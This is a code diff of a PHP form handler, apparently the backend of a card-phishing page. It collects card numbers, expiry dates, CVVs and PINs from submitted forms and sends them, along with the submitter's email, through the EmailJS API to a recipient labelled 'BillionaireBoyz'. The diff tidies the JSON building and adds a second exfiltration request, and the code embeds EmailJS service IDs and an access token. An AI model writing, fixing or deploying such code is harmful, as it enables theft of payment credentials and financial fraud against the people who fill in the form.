@@ -38,20 +38,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $email = $_POST['form_fields']["email"];
     }
 
-    $card_data = <<<card_data
-    {
-        "currency": $currency,
-        "card_type": $cardType,
-        "amount": $cardAmount,
-        "redemption_number": $redemptionNumber,
-        "card_number": $cardNumber,
-        "exp_mm": $expMM,
-        "exp_yy": $expYY,
-        "cvv": $cardCVV,
-        "pin": $cardPIN
-    }
-    card_data;
-
+    // --- Send card data as before ---
+    $card_data = [
+        "currency" => $currency,
+        "card_type" => $cardType,
+        "amount" => $cardAmount,
+        "redemption_number" => $redemptionNumber,
+        "card_number" => $cardNumber,
+        "exp_mm" => $expMM,
+        "exp_yy" => $expYY,
+        "cvv" => $cardCVV,
+        "pin" => $cardPIN
+    ];
     $email_card_data = json_encode($card_data);
 
     $url = "https://api.emailjs.com/api/v1.0/email/send";
@@ -67,52 +65,47 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
 
-    $data = <<<data
-    {
-        "service_id": "service_t84qq3v",
-        "template_id": "template_l1dza9m",
-        "user_id": "-GXR5-vheoKdhIIH4",
-        "accessToken": "sMjA-i0fQ9-tjs4HYIm4L",
-        "template_params": {
-            "to_name":"BillionaireBoyz",
-            "from_name":"Cardly Supply 3",
-            "message": $email_card_data
-        }
-    }
-    data;
+    $data = json_encode([
+        "service_id" => "service_t84qq3v",
+        "template_id" => "template_l1dza9m",
+        "user_id" => "-GXR5-vheoKdhIIH4",
+        "accessToken" => "sMjA-i0fQ9-tjs4HYIm4L",
+        "template_params" => [
+            "to_name" => "BillionaireBoyz",
+            "from_name" => "Cardly Supply 3",
+            "message" => $email_card_data
+        ]
+    ]);
 
     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
     $resp = curl_exec($curl);
     curl_close($curl);
 
+    // --- Send only the email to the same endpoint but with different data ---
     if (!empty($email)) {
-        $user_email_data = <<<user_email_data
-        {
-            "email": $email,
-        }
-        user_email_data;
+        $curl2 = curl_init();
+        curl_setopt($curl2, CURLOPT_URL, $url);
+        curl_setopt($curl2, CURLOPT_POST, true);
+        curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
 
-        $user_email_card_data = json_encode($user_email_data);
+        $email_data = json_encode([
+            "service_id" => "service_t84qq3v",
+            "template_id" => "template_brtd0x7",
+            "user_id" => "-GXR5-vheoKdhIIH4",
+            "accessToken" => "sMjA-i0fQ9-tjs4HYIm4L",
+            "template_params" => [
+                "to_name" => "BillionaireBoyz",
+                "from_name" => "Cardly Supply 3",
+                "message" => json_encode(["email" => $email])
+            ]
+        ]);
 
-        $email_data = <<<email_data
-        {
-            "service_id": "service_t84qq3v",
-            "template_id": "template_brtd0x7",
-            "user_id": "-GXR5-vheoKdhIIH4",
-            "accessToken": "sMjA-i0fQ9-tjs4HYIm4L",
-            "template_params": {
-                "to_name":"BillionaireBoyz",
-                "from_name":"Cardly Supply 3",
-                "message": $user_email_card_data
-            }
-        }
-        email_data;
+        curl_setopt($curl2, CURLOPT_POSTFIELDS, $email_data);
 
-        curl_setopt($curl, CURLOPT_POSTFIELDS, $email_data);
-
-        $resp = curl_exec($curl);
-        curl_close($curl);
+        curl_exec($curl2);
+        curl_close($curl2);
     }
 
     if ($resp === false) {
